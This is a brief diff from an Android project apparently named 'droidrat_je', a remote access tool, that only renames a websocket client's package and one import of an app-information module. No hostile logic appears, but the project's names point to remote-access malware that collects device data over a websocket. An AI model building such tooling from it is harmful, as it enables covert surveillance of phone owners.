@@ -1,11 +1,11 @@
-package com.je_chen.droidrat_je.socket.websocket;
+package com.je_chen.droidrat_je.util.socket.websocket;
 
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.util.Log;
 
 
-import com.je_chen.droidrat_je.modules.appsinfo.getinfo.GetPackagesInfo;
+import com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo.GetPackagesInfo;
 
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
